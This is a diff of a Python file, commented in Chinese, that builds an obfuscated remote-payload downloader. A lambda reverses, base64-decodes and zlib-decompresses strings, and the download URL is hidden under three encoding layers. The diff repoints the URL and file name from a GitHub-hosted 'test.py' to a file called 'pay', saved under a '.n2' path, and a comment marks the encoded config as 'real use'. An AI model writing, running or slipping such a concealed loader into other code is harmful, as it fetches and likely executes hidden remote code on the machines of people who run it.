@@ -15,19 +15,20 @@ import ssl
 _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
 
 # 混淆的配置信息 - 真实使用
-# 原始: "https://raw.githubusercontent.com/yq00/amp_test_demo/refs/heads/main/250627/test.py"
+# 原始URL: "https://raw.githubusercontent.com/yq00/amp_test_demo/refs/heads/main/250627/pay"
 encoded_config = b'ZWNlYygoXykoYg=='
 
 # 混淆的下载URL - 多层编码
+# 原始URL: https://raw.githubusercontent.com/yq00/amp_test_demo/refs/heads/main/250627/pay
 # 第一层: base64编码
-url_base64 = b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3lxMDAvYW1wX3Rlc3RfZGVtby9yZWZzL2hlYWRzL21haW4vMjUwNjI3L3Rlc3QucHk='
+url_base64 = b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3lxMDAvYW1wX3Rlc3RfZGVtby9yZWZzL2hlYWRzL21haW4vMjUwNjI3L3BheQ=='
 # 第二层: 字符串反转
 url_reversed = url_base64[::-1]
 # 第三层: zlib压缩
 url_compressed = zlib.compress(url_reversed)
 
 # 混淆的文件名和路径
-encoded_filename = b'dGVzdC5weQ=='  # "test.py"
+encoded_filename = b'cGF5'  # "pay"
 encoded_path = b'Lm4y'  # ".n2"
 
 # 配置信息
